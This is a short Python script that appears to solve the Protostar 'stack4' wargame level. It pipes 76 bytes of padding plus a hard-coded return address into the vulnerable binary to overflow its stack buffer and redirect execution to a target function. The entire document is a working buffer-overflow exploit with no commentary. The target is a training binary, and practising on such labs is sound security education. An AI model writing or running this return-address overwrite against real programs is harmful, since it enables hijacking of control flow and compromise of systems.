import subprocess

path = '/opt/protostar/bin/stack4'
padding = 'A'*76
win_addr = '\xf4\x83\x04\x08'

p = subprocess.Popen(path, stdin=subprocess.PIPE)
p.stdin.write(padding+win_addr)
stdout, stderr = p.communicate()
